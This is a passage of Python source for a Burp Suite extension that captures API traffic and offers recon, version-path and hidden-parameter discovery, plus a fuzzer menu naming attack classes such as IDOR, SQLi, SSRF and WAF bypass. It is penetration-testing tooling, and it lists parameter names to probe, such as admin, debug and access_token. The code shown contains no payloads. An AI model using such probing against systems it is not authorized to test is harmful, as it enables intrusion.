# -*- coding: utf-8 -*-
# pylint: disable=import-error
import json
import re
import threading
import time

from burp import IBurpExtender, IContextMenuFactory, IHttpListener, IProxyListener, ITab
from java.awt import BorderLayout, Color, FlowLayout, Font, GridLayout
from java.awt.event import MouseAdapter
from java.io import File, FileWriter
from java.net import URL
from java.text import SimpleDateFormat
from java.util import ArrayList, Date
from javax.swing import (
    BorderFactory,
    Box,
    BoxLayout,
    DefaultListModel,
    JButton,
    JCheckBox,
    JComboBox,
    JFileChooser,
    JLabel,
    JList,
    JMenuItem,
    JOptionPane,
    JPanel,
    JPopupMenu,
    JScrollPane,
    JSplitPane,
    JTabbedPane,
    JTextArea,
    JTextField,
    ListCellRenderer,
    SwingUtilities,
)
from javax.swing.event import DocumentListener, ListSelectionListener


class SearchListener(DocumentListener):
    def __init__(self, extender, delay_ms=300):
        self.extender = extender
        self.timer = None
        self.delay_ms = delay_ms

    def insertUpdate(self, e):
        self._schedule()

    def removeUpdate(self, e):
        self._schedule()

    def changedUpdate(self, e):
        self._schedule()

    def _schedule(self):
        if self.timer:
            self.timer.cancel()
        self.timer = threading.Timer(
            self.delay_ms / 1000.0,
            lambda: SwingUtilities.invokeLater(self.extender.refresh_view),
        )
        self.timer.daemon = True
        self.timer.start()


class BurpExtender(
    IBurpExtender, ITab, IHttpListener, IProxyListener, IContextMenuFactory
):
    PARAM_URL = 0
    PARAM_BODY = 1
    PARAM_COOKIE = 2
    PARAM_JSON = 6

    # Pre-compiled regex patterns for performance
    NUMERIC_ID_PATTERN = re.compile(r"/\d+")
    UUID_PATTERN = re.compile(
        r"/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
        re.IGNORECASE
    )
    OBJECTID_PATTERN = re.compile(r"/[0-9a-f]{24}")
    BASE64_PATTERN = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")
    HEX_PATTERN = re.compile(r"[0-9a-fA-F]{32,}")
    ANSI_ESCAPE_PATTERN = re.compile(r"\x1b\[[0-9;]*[mK]")

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("API Security Suite")

        self.api_data = {}
        self.endpoint_tags = {}
        self.endpoint_times = {}
        self.lock = threading.Lock()
        self.max_endpoints = 800
        self.max_body_size = 5000

        # Pagination state
        self.current_page = 0
        self.page_size = 100
        self.total_pages = 0

        self._panel = JPanel(BorderLayout())
        self._panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10))

        # Create tabbed pane
        self.tabbed_pane = JTabbedPane()

        # Recon tab
        recon_panel = JPanel(BorderLayout())
        top_panel = JPanel()
        top_panel.setLayout(GridLayout(2, 1))

        # Statistics panel
        stats_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        stats_panel.setBorder(BorderFactory.createTitledBorder("Statistics"))
        self.stats_label = JLabel(
            "Endpoints: 0 | Critical: 0 | High: 0 | Medium: 0 | Hosts: 0"
        )
        self.stats_label.setFont(Font("Monospaced", Font.BOLD, 12))
        stats_panel.add(self.stats_label)

        controls_row = JPanel(FlowLayout(FlowLayout.LEFT))
        self.auto_capture = JCheckBox("Auto-Capture", True)
        controls_row.add(self.auto_capture)
        samples_label = JLabel("Samples:")
        samples_label.setToolTipText("Max samples to capture per unique endpoint")
        controls_row.add(samples_label)
        self.sample_limit = JComboBox(["1", "3", "5", "10"])
        self.sample_limit.setSelectedItem("3")
        self.sample_limit.setToolTipText(
            "Number of request/response samples to collect per endpoint (e.g., GET:/api/users/{id})"
        )
        controls_row.add(self.sample_limit)

        # Pagination controls
        controls_row.add(JLabel(" | Page:"))
        self.page_label = JLabel("1/1")
        controls_row.add(self.page_label)
        self.prev_page_btn = JButton("<")
        self.prev_page_btn.addActionListener(lambda e: self._prev_page())
        controls_row.add(self.prev_page_btn)
        self.next_page_btn = JButton(">")
        self.next_page_btn.addActionListener(lambda e: self._next_page())
        controls_row.add(self.next_page_btn)
        page_size_label = JLabel("Per page:")
        controls_row.add(page_size_label)
        self.page_size_combo = JComboBox(["50", "100", "200", "500"])
        self.page_size_combo.setSelectedItem("100")
        self.page_size_combo.addActionListener(lambda e: self._change_page_size())
        controls_row.add(self.page_size_combo)

        filter_row = JPanel(FlowLayout(FlowLayout.LEFT))
        filter_row.add(JLabel("Search:"))
        self.search_field = JTextField(15)
        self.search_field.getDocument().addDocumentListener(SearchListener(self))
        filter_row.add(self.search_field)
        filter_row.add(JLabel("Host:"))
        self.host_filter = JComboBox(["All"])
        self.host_filter.addActionListener(lambda e: self._on_filter_change())
        filter_row.add(self.host_filter)
        filter_row.add(JLabel("Method:"))
        self.method_filter = JComboBox(
            ["All", "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
        )
        self.method_filter.addActionListener(lambda e: self._on_filter_change())
        filter_row.add(self.method_filter)
        filter_row.add(JLabel("Severity:"))
        self.severity_filter = JComboBox(["All", "Critical", "High", "Medium", "Info"])
        self.severity_filter.addActionListener(lambda e: self._on_filter_change())
        filter_row.add(self.severity_filter)
        filter_row.add(JLabel("Group:"))
        self.group_by = JComboBox(["None", "Host", "Method", "Auth", "Encryption"])
        self.group_by.addActionListener(lambda e: self._on_group_change())
        filter_row.add(self.group_by)

        top_panel.add(stats_panel)
        top_panel.add(controls_row)
        top_panel.add(filter_row)
        recon_panel.add(top_panel, BorderLayout.NORTH)

        self.list_model = DefaultListModel()
        self.endpoint_list = JList(self.list_model)
        self.endpoint_list.setFont(Font("Monospaced", Font.PLAIN, 12))
        self.endpoint_list.setCellRenderer(EndpointRenderer(self))
        self.endpoint_list.addMouseListener(EndpointClickListener(self))
        self.endpoint_list.addListSelectionListener(EndpointSelectionListener(self))
        endpoint_scroll = JScrollPane(self.endpoint_list)
        endpoint_scroll.setBorder(
            BorderFactory.createTitledBorder("Captured API Endpoints")
        )

        # Details panel
        self.details_area = JTextArea()
        self.details_area.setEditable(False)
        self.details_area.setFont(Font("Monospaced", Font.PLAIN, 11))
        details_scroll = JScrollPane(self.details_area)
        details_scroll.setBorder(BorderFactory.createTitledBorder("Endpoint Details"))

        self.log_area = JTextArea(8, 80)
        self.log_area.setEditable(False)
        self.log_area.setFont(Font("Monospaced", Font.PLAIN, 11))
        log_scroll = JScrollPane(self.log_area)
        log_scroll.setBorder(BorderFactory.createTitledBorder("Activity Log"))

        main_split = JSplitPane(
            JSplitPane.HORIZONTAL_SPLIT, endpoint_scroll, details_scroll
        )
        main_split.setResizeWeight(0.5)

        bottom_split = JSplitPane(JSplitPane.VERTICAL_SPLIT, main_split, log_scroll)
        bottom_split.setResizeWeight(0.7)
        recon_panel.add(bottom_split, BorderLayout.CENTER)

        btn_panel = JPanel(GridLayout(1, 5, 5, 5))

        export_btn = JButton("Export All")
        export_btn.setBackground(Color(40, 167, 69))
        export_btn.setForeground(Color.WHITE)
        export_btn.addActionListener(lambda e: self.export_api_data())

        export_host_btn = JButton("Export Host")
        export_host_btn.setBackground(Color(23, 162, 184))
        export_host_btn.setForeground(Color.WHITE)
        export_host_btn.addActionListener(lambda e: self.export_by_host())

        import_btn = JButton("Import")
        import_btn.setBackground(Color(0, 123, 255))
        import_btn.setForeground(Color.WHITE)
        import_btn.addActionListener(lambda e: self.import_data())

        clear_btn = JButton("Clear Data")
        clear_btn.setBackground(Color(220, 53, 69))
        clear_btn.setForeground(Color.WHITE)
        clear_btn.addActionListener(lambda e: self.clear_data())

        refresh_btn = JButton("Refresh")
        refresh_btn.setBackground(Color(108, 117, 125))
        refresh_btn.setForeground(Color.WHITE)
        refresh_btn.addActionListener(lambda e: self.refresh_view())

        btn_panel.add(export_btn)
        btn_panel.add(export_host_btn)
        btn_panel.add(import_btn)
        btn_panel.add(clear_btn)
        btn_panel.add(refresh_btn)

        recon_panel.add(btn_panel, BorderLayout.SOUTH)

        # Diff tab
        diff_panel = self._create_diff_tab()

        # Version Scanner tab
        version_panel = self._create_version_tab()

        # Param Miner tab
        param_panel = self._create_param_tab()

        # Fuzzer tab
        fuzzer_panel = self._create_fuzzer_tab()

        # Nuclei tab
        nuclei_panel = self._create_nuclei_tab()

        # HTTPX tab
        httpx_panel = self._create_httpx_tab()

        # Katana tab
        katana_panel = self._create_katana_tab()

        # FFUF tab
        ffuf_panel = self._create_ffuf_tab()

        # Wayback tab
        wayback_panel = self._create_wayback_tab()

        # Add tabs
        self.tabbed_pane.addTab("Recon", recon_panel)
        self.tabbed_pane.addTab("Diff", diff_panel)
        self.tabbed_pane.addTab("Version Scanner", version_panel)
        self.tabbed_pane.addTab("Param Miner", param_panel)
        self.tabbed_pane.addTab("Fuzzer", fuzzer_panel)
        self.tabbed_pane.addTab("Nuclei", nuclei_panel)
        self.tabbed_pane.addTab("HTTPX", httpx_panel)
        self.tabbed_pane.addTab("Katana", katana_panel)
        self.tabbed_pane.addTab("FFUF", ffuf_panel)
        self.tabbed_pane.addTab("Wayback", wayback_panel)

        self._panel.add(self.tabbed_pane, BorderLayout.CENTER)

        # Initialize output directory for external tools
        import os

        self.output_dir = os.path.join(os.path.expanduser("~"), "burp_APIRecon")
        if not os.path.exists(self.output_dir):
            try:
                os.makedirs(self.output_dir)
            except Exception as e:
                self._callbacks.printError(
                    "Failed to create output directory: {}".format(str(e))
                )

        callbacks.registerHttpListener(self)
        callbacks.registerProxyListener(self)
        callbacks.registerContextMenuFactory(self)
        callbacks.addSuiteTab(self)

        self.log_to_ui("[+] API Security Suite loaded - Capturing API traffic...")

    def _create_action_button(self, text, color, action):
        """Helper to create styled action button"""
        btn = JButton(text)
        btn.setBackground(color)
        btn.setForeground(Color.WHITE)
        btn.addActionListener(action)
        return btn

    def _create_text_area_panel(self):
        """Helper to create read-only text area with scroll"""
        area = JTextArea()
        area.setEditable(False)
        area.setFont(Font("Monospaced", Font.PLAIN, 11))
        return area, JScrollPane(area)

    def _copy_to_clipboard(self, text):
        """Copy text to system clipboard"""
        from java.awt import Toolkit
        from java.awt.datatransfer import StringSelection

        if text:
            selection = StringSelection(text)
            clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
            clipboard.setContents(selection, None)
            self.log_to_ui("[+] Copied {} chars to clipboard".format(len(text)))
        else:
            self.log_to_ui("[!] No text to copy")

    def _create_diff_tab(self):
        """Create the Diff comparison tab"""
        panel = JPanel(BorderLayout())
        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("Compare:"))
        controls.add(
            JButton("Load Export 1").addActionListener(
                lambda e: self._load_diff_file(1)
            )
            or JButton("Load Export 1")
        )
        controls.add(
            JButton("Load Export 2").addActionListener(
                lambda e: self._load_diff_file(2)
            )
            or JButton("Load Export 2")
        )
        controls.add(
            self._create_action_button(
                "Compare", Color(40, 167, 69), lambda e: self._run_diff()
            )
        )
        controls.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.diff_area.setText("")
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.diff_area.getText()),
            )
        )
        panel.add(controls, BorderLayout.NORTH)
        self.diff_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        self.diff_file1 = None
        self.diff_file2 = None
        return panel

    def _load_diff_file(self, slot):
        chooser = JFileChooser()
        if chooser.showOpenDialog(self._panel) == JFileChooser.APPROVE_OPTION:
            filepath = chooser.getSelectedFile().getAbsolutePath()
            if slot == 1:
                self.diff_file1 = filepath
                self.log_to_ui("[+] Loaded Export 1: {}".format(filepath))
            else:
                self.diff_file2 = filepath
                self.log_to_ui("[+] Loaded Export 2: {}".format(filepath))

    def _run_diff(self):
        if not self.diff_file1 or not self.diff_file2:
            self.diff_area.setText("Load both exports first")
            return

        try:
            with open(self.diff_file1) as f:
                data1 = json.load(f)
            with open(self.diff_file2) as f:
                data2 = json.load(f)

            eps1 = set([ep["endpoint"] for ep in data1["endpoints"]])
            eps2 = set([ep["endpoint"] for ep in data2["endpoints"]])

            added = eps2 - eps1
            removed = eps1 - eps2
            common = eps1 & eps2

            result = []
            result.append("=" * 80)
            result.append("DIFF COMPARISON")
            result.append("=" * 80)
            result.append("Export 1: {} endpoints".format(len(eps1)))
            result.append("Export 2: {} endpoints".format(len(eps2)))
            result.append("")
            result.append("Added: {} endpoints".format(len(added)))
            for ep in sorted(added)[:20]:
                result.append("  + {}".format(ep))
            result.append("")
            result.append("Removed: {} endpoints".format(len(removed)))
            for ep in sorted(removed)[:20]:
                result.append("  - {}".format(ep))
            result.append("")
            result.append("Unchanged: {} endpoints".format(len(common)))

            self.diff_area.setText("\n".join(result))
            self.log_to_ui(
                "[+] Diff complete: +{} -{} ={}".format(
                    len(added), len(removed), len(common)
                )
            )
        except Exception as e:
            self.diff_area.setText("Error: {}".format(str(e)))

    def _create_scanner_tab(self, label, default_input, button_text, action, area_attr):
        """Helper to create scanner-style tabs"""
        panel = JPanel(BorderLayout())
        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel(label))
        input_field = JTextField(default_input, 30)
        controls.add(input_field)
        controls.add(
            self._create_action_button(button_text, Color(40, 167, 69), action)
        )
        panel.add(controls, BorderLayout.NORTH)
        area, scroll = self._create_text_area_panel()
        setattr(self, area_attr, area)
        setattr(self, area_attr.replace("_area", "_input"), input_field)
        panel.add(scroll, BorderLayout.CENTER)
        return panel

    def _create_version_tab(self):
        """Create Version Scanner tab"""
        panel = JPanel(BorderLayout())

        # Top controls
        top_panel = JPanel()
        top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

        # Input row
        input_row = JPanel(FlowLayout(FlowLayout.LEFT))
        input_row.add(JLabel("Versions:"))
        self.version_input = JTextField(
            "v1,v2,v3,v4,v5,api/v1,api/v2,api/v3,v1.0,v2.0,rest/v1,mobile/v1,internal/v1,dev,test,staging,beta,alpha,old,legacy,deprecated",
            35,
        )
        input_row.add(self.version_input)

        # Preset buttons
        preset_row = JPanel(FlowLayout(FlowLayout.LEFT))
        preset_row.add(JLabel("Presets:"))
        preset_row.add(
            self._create_action_button(
                "Standard",
                Color(108, 117, 125),
                lambda e: self.version_input.setText(
                    "v1,v2,v3,v4,v5,api/v1,api/v2,api/v3"
                ),
            )
        )
        preset_row.add(
            self._create_action_button(
                "Decimal",
                Color(108, 117, 125),
                lambda e: self.version_input.setText(
                    "v1.0,v1.1,v2.0,v2.1,v3.0,api/v1.0,api/v2.0"
                ),
            )
        )
        preset_row.add(
            self._create_action_button(
                "Environments",
                Color(108, 117, 125),
                lambda e: self.version_input.setText(
                    "dev,test,staging,beta,alpha,prod,internal"
                ),
            )
        )
        preset_row.add(
            self._create_action_button(
                "Legacy",
                Color(108, 117, 125),
                lambda e: self.version_input.setText(
                    "old,legacy,deprecated,v0,archive,backup"
                ),
            )
        )
        preset_row.add(
            self._create_action_button(
                "All",
                Color(108, 117, 125),
                lambda e: self.version_input.setText(
                    "v1,v2,v3,v4,v5,api/v1,api/v2,api/v3,v1.0,v2.0,rest/v1,mobile/v1,internal/v1,dev,test,staging,beta,alpha,old,legacy,deprecated"
                ),
            )
        )

        # Action buttons
        action_row = JPanel(FlowLayout(FlowLayout.LEFT))
        action_row.add(
            self._create_action_button(
                "Scan Versions", Color(40, 167, 69), lambda e: self._scan_versions()
            )
        )
        action_row.add(
            self._create_action_button(
                "Export Results",
                Color(70, 130, 180),
                lambda e: self._export_version_results(),
            )
        )
        action_row.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.version_area.setText("")
            )
        )
        action_row.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.version_area.getText()),
            )
        )

        top_panel.add(input_row)
        top_panel.add(preset_row)
        top_panel.add(action_row)
        panel.add(top_panel, BorderLayout.NORTH)

        self.version_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        return panel

    def _format_result(self, title, lines):
        """Helper to format result output"""
        # Decode HTML entities
        formatted_lines = []
        for line in lines:
            line = (
                line.replace("&gt;", ">")
                .replace("&lt;", "<")
                .replace("&amp;", "&")
                .replace("&quot;", '"')
                .replace("&#39;", "'")
            )
            formatted_lines.append(line)
        return "\n".join([title, "=" * 80, ""] + formatted_lines)

    def _scan_versions(self):
        versions = [v.strip() for v in self.version_input.getText().split(",")]
        self.version_results = []
        lines = []

        # Filter to API endpoints only
        api_endpoints = {}
        for key, entries in self.api_data.items():
            entry = self._get_entry(entries)
            path = entry["normalized_path"].lower()

            # Skip static files
            if any(
                path.endswith(ext) for ext in [".js", ".css", ".html", ".json", ".xml"]
            ):
                continue

            # Skip image/font paths
            if any(
                x in path
                for x in [
                    "/dist/",
                    "/static/",
                    "/css/",
                    "/shreddit/",
                    "/recaptcha/",
                    "/gsi/",
                ]
            ):
                continue

            # Skip if already versioned
            if any(v in path for v in ["/v1/", "/v2/", "/v3/", "/api/v"]):
                continue

            # Only include API-like paths
            if "/api/" in path or "/svc/" in path or path.startswith("/r/"):
                api_endpoints[key] = entries

        if not api_endpoints:
            self.version_area.setText(
                "[!] No API endpoints found (filtered out static files)\n"
            )
            return

        for key, entries in api_endpoints.items():
            entry = self._get_entry(entries)
            path = entry["normalized_path"]
            host = entry["host"]
            protocol = entry["protocol"]

            for ver in versions:
                test_path = "/" + ver + path
                result = "Test: {} -> {}://{}{}".format(key, protocol, host, test_path)
                lines.append(result)
                self.version_results.append(result)

        summary = []
        summary.append(
            "[*] Filtered: {} API endpoints (excluded static files)".format(
                len(api_endpoints)
            )
        )
        summary.append("[*] Testing {} version variations".format(len(versions)))
        summary.append("[*] Total tests: {}\n".format(len(self.version_results)))

        self.version_area.setText(
            self._format_result(
                "Version Discovery: {}".format(", ".join(versions)), summary + lines
            )
        )
        self.log_to_ui(
            "[*] Version scan: {} API endpoints, {} tests".format(
                len(api_endpoints), len(self.version_results)
            )
        )

    def _export_version_results(self):
        """Export version scan results - only saves when user clicks Export"""
        if not hasattr(self, "version_results") or not self.version_results:
            self.version_area.append("\n[!] Run 'Scan Versions' first\n")
            return
        import os

        export_dir = self._get_export_dir("VersionScan_Export")
        if not export_dir:
            return
        filepath = os.path.join(export_dir, "version_scan.txt")
        writer = None
        try:
            writer = FileWriter(filepath)
            for result in self.version_results:
                writer.write(result + "\n")
            self.version_area.append(
                "\n[+] Exported {} results\n[+] Folder: {}\n[+] File: {}\n".format(
                    len(self.version_results), export_dir, filepath
                )
            )
            self.log_to_ui("[+] Exported version scan to: {}".format(export_dir))
        except Exception as e:
            self.version_area.append("\n[!] Export failed: {}\n".format(str(e)))
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError(
                        "Error closing version scan file: {}".format(str(e))
                    )

    def _create_param_tab(self):
        """Create Param Miner tab"""
        panel = JPanel(BorderLayout())

        # Top controls
        top_panel = JPanel()
        top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

        # Input row
        input_row = JPanel(FlowLayout(FlowLayout.LEFT))
        input_row.add(JLabel("Params:"))
        self.param_input = JTextField(
            "admin,debug,internal,test,dev,is_admin,role,callback,redirect,url,hidden,secret,verbose,trace,access_token,api_key",
            35,
        )
        input_row.add(self.param_input)

        # Preset buttons
        preset_row = JPanel(FlowLayout(FlowLayout.LEFT))
        preset_row.add(JLabel("Presets:"))
        preset_row.add(
            self._create_action_button(
                "Admin",
                Color(108, 117, 125),
                lambda e: self.param_input.setText(
                    "admin,is_admin,isAdmin,role,admin_panel,administrator"
                ),
            )
        )
        preset_row.add(
            self._create_action_button(
                "Debug",
                Color(108, 117, 125),
                lambda e: self.param_input.setText(
                    "debug,verbose,trace,log,logging,dev_mode,test_mode"
                ),
            )
        )
        preset_row.add(
            self._create_action_button(
                "Access",
                Color(108, 117, 125),
                lambda e: self.param_input.setText(
                    "internal,private,hidden,secret,key,token,access"
                ),
            )
        )
        preset_row.add(
            self._create_action_button(
                "Callback",
                Color(108, 117, 125),
                lambda e: self.param_input.setText(
                    "callback,redirect,url,return_url,next,dest,destination"
                ),
            )
        )
        preset_row.add(
            self._create_action_button(
                "All",
                Color(108, 117, 125),
                lambda e: self.param_input.setText(
                    "admin,debug,internal,test,dev,is_admin,role,callback,redirect,url,hidden,secret,verbose,trace,access_token,api_key"
                ),
            )
        )

        # Action buttons
        action_row = JPanel(FlowLayout(FlowLayout.LEFT))
        action_row.add(
            self._create_action_button(
                "Mine Params", Color(40, 167, 69), lambda e: self._mine_params()
            )
        )
        action_row.add(
            self._create_action_button(
                "Export Results",
                Color(70, 130, 180),
                lambda e: self._export_param_results(),
            )
        )
        action_row.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.param_area.setText("")
            )
        )
        action_row.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.param_area.getText()),
            )
        )

        top_panel.add(input_row)
        top_panel.add(preset_row)
        top_panel.add(action_row)
        panel.add(top_panel, BorderLayout.NORTH)

        self.param_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        return panel

    def _mine_params(self):
        if not self.api_data:
            self.param_area.setText(
                "[!] No endpoints captured. Import data or capture traffic first."
            )
            self.log_to_ui("[!] No endpoints to mine")
            return

        base_params = [p.strip() for p in self.param_input.getText().split(",")]
        self.param_results = []

        # Filter to API endpoints only
        api_endpoints = {}
        for key, entries in self.api_data.items():
            entry = self._get_entry(entries)
            path = entry["normalized_path"].lower()

            # Skip static files
            if any(
                path.endswith(ext) for ext in [".js", ".css", ".html", ".json", ".xml"]
            ):
                continue

            # Skip static resource paths
            if any(
                x in path
                for x in ["/dist/", "/static/", "/css/", "/shreddit/", "/recaptcha/"]
            ):
                continue

            # Prioritize API paths
            if (
                "/api/" in path
                or "/svc/" in path
                or entry["method"] in ["POST", "PUT", "PATCH", "DELETE"]
            ):
                api_endpoints[key] = entries

        if not api_endpoints:
            self.param_area.setText(
                "[!] No API endpoints found (filtered out static files)\n"
            )
            return

        # Group by priority
        high_priority = {}
        medium_priority = {}

        for key, entries in api_endpoints.items():
            entry = self._get_entry(entries)
            path = entry["normalized_path"].lower()
            method = entry["method"]

            # High priority: write operations or admin paths
            if method in ["POST", "PUT", "PATCH", "DELETE"] or any(
                x in path for x in ["/admin", "/user", "/account", "/profile"]
            ):
                high_priority[key] = entries
            else:
                medium_priority[key] = entries

        lines = []
        lines.append(
            "[*] Filtered: {} API endpoints (excluded {} static files)".format(
                len(api_endpoints), len(self.api_data) - len(api_endpoints)
            )
        )
        lines.append(
            "[*] High Priority: {} | Medium Priority: {}\n".format(
                len(high_priority), len(medium_priority)
            )
        )

        # Process high priority first
        if high_priority:
            lines.append("\n=== HIGH PRIORITY (Write Operations) ===")
            for key, entries in sorted(high_priority.items())[:15]:
                entry = self._get_entry(entries)
                existing = entry.get("parameters", {})
                url_params = (
                    list(existing.get("url", {}).keys())
                    if isinstance(existing.get("url"), dict)
                    else existing.get("url", [])
                )

                # Smart param suggestions based on endpoint
                path = entry["normalized_path"].lower()
                smart_params = list(base_params)
                if "/user" in path or "/account" in path:
                    smart_params.extend(["user_id", "role", "is_admin"])
                if entry["method"] in ["POST", "PUT", "PATCH"]:
                    smart_params.extend(["_method", "callback"])

                result = "{}\n  Existing: {}\n  Test: {}".format(
                    key,
                    ", ".join(url_params[:8]) if url_params else "None",
                    ", ".join(list(set(smart_params))[:10]),
                )
                lines.append(result)
                self.param_results.append(result)

        # Process medium priority (limited)
        if medium_priority:
            lines.append("\n=== MEDIUM PRIORITY (Read Operations) ===")
            for key, entries in sorted(medium_priority.items())[:10]:
                entry = self._get_entry(entries)
                existing = entry.get("parameters", {})
                url_params = (
                    list(existing.get("url", {}).keys())
                    if isinstance(existing.get("url"), dict)
                    else existing.get("url", [])
                )
                result = "{}\n  Existing: {}\n  Test: {}".format(
                    key,
                    ", ".join(url_params[:8]) if url_params else "None",
                    ", ".join(base_params),
                )
                lines.append(result)
                self.param_results.append(result)

        if len(medium_priority) > 10:
            lines.append(
                "\n[*] {} more medium priority endpoints not shown".format(
                    len(medium_priority) - 10
                )
            )

        self.param_area.setText(
            self._format_result(
                "Parameter Mining: {}".format(", ".join(base_params)), lines
            )
        )
        self.log_to_ui(
            "[*] Param mining: {} API endpoints ({} high, {} medium)".format(
                len(api_endpoints), len(high_priority), len(medium_priority)
            )
        )

    def _export_param_results(self):
        """Export param mining results - only saves when user clicks Export"""
        if not hasattr(self, "param_results") or not self.param_results:
            self.param_area.append("\n[!] Run 'Mine Params' first\n")
            return
        import os

        export_dir = self._get_export_dir("ParamMiner_Export")
        if not export_dir:
            return
        filepath = os.path.join(export_dir, "param_mining.txt")
        writer = None
        try:
            writer = FileWriter(filepath)
            for result in self.param_results:
                writer.write(result + "\n\n")
            self.param_area.append(
                "\n[+] Exported {} results\n[+] Folder: {}\n[+] File: {}\n".format(
                    len(self.param_results), export_dir, filepath
                )
            )
            self.log_to_ui("[+] Exported param mining to: {}".format(export_dir))
        except Exception as e:
            self.param_area.append("\n[!] Export failed: {}\n".format(str(e)))
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError(
                        "Error closing param mining file: {}".format(str(e))
                    )

    def _create_fuzzer_tab(self):
        """Create Fuzzer tab"""
        panel = JPanel(BorderLayout())

        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("Attack:"))
        self.attack_type_combo = JComboBox(
            ["All", "BOLA", "IDOR", "Auth Bypass", "SQLi", "XSS", "SSRF", "XXE", "WAF Bypass"]
        )
        controls.add(self.attack_type_combo)
        controls.add(
            self._create_action_button(
                "Generate",
                Color(220, 53, 69),
                lambda e: self._generate_fuzzing(
                    str(self.attack_type_combo.getSelectedItem())
                ),
            )
        )
        controls.add(
            self._create_action_button(
                "Send to Intruder",
                Color(255, 140, 0),
                lambda e: self._send_fuzzing_to_intruder(),
            )
        )
        controls.add(
            self._create_action_button(
                "Export Payloads", Color(0, 123, 255), lambda e: self._export_payloads()
            )
        )
        controls.add(
            self._create_action_button(
                "AI Payloads", Color(138, 43, 226), lambda e: self._export_ai_context()
            )
        )
        controls.add(
            self._create_action_button(
                "Turbo Intruder",
                Color(255, 87, 34),
                lambda e: self._export_turbo_intruder(),
            )
        )
        controls.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.fuzzer_area.setText("")
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.fuzzer_area.getText()),
            )
        )
        controls.add(
            self._create_action_button(
                "Copy as cURL",
                Color(76, 175, 80),
                lambda e: self._copy_attack_as_curl(),
            )
        )

        panel.add(controls, BorderLayout.NORTH)

        self.fuzzer_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        self.fuzzing_attacks = []
        return panel

    def _create_nuclei_tab(self):
        """Create Nuclei scanner tab"""
        panel = JPanel(BorderLayout())

        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("Nuclei Path:"))
        import os

        default_nuclei = os.path.expanduser("~/go/bin/nuclei")
        self.nuclei_path_field = JTextField(
            default_nuclei if os.path.exists(default_nuclei) else "nuclei", 25
        )
        controls.add(self.nuclei_path_field)
        controls.add(
            self._create_action_button(
                "Run Nuclei", Color(138, 43, 226), lambda e: self._run_nuclei()
            )
        )
        controls.add(
            self._create_action_button(
                "Export Targets",
                Color(70, 130, 180),
                lambda e: self._export_nuclei_targets(),
            )
        )
        controls.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.nuclei_area.setText("")
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.nuclei_area.getText()),
            )
        )

        panel.add(controls, BorderLayout.NORTH)

        self.nuclei_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        return panel

    def _create_httpx_tab(self):
        """Create HTTPX probe tab"""
        panel = JPanel(BorderLayout())

        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("HTTPX Path:"))
        import os

        httpx_paths = [
            os.path.expanduser("~/go/bin/httpx"),
            "/usr/local/bin/httpx",
            "httpx",
        ]
        default_httpx = next((p for p in httpx_paths if os.path.exists(p)), "httpx")
        self.httpx_path_field = JTextField(default_httpx, 25)
        controls.add(self.httpx_path_field)
        controls.add(
            self._create_action_button(
                "Probe Endpoints", Color(0, 150, 136), lambda e: self._run_httpx(e)
            )
        )
        controls.add(
            self._create_action_button(
                "Export URLs", Color(70, 130, 180), lambda e: self._export_httpx_urls()
            )
        )
        controls.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.httpx_area.setText("")
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.httpx_area.getText()),
            )
        )

        panel.add(controls, BorderLayout.NORTH)

        self.httpx_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        return panel

    def _create_katana_tab(self):
        """Create Katana crawler tab"""
        panel = JPanel(BorderLayout())

        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("Katana Path:"))
        import os

        default_katana = os.path.expanduser("~/go/bin/katana")
        self.katana_path_field = JTextField(
            default_katana if os.path.exists(default_katana) else "katana", 25
        )
        controls.add(self.katana_path_field)
        controls.add(
            self._create_action_button(
                "Crawl Endpoints", Color(156, 39, 176), lambda e: self._run_katana(e)
            )
        )
        controls.add(
            self._create_action_button(
                "Export Discovered",
                Color(70, 130, 180),
                lambda e: self._export_katana_results(),
            )
        )
        controls.add(
            self._create_action_button(
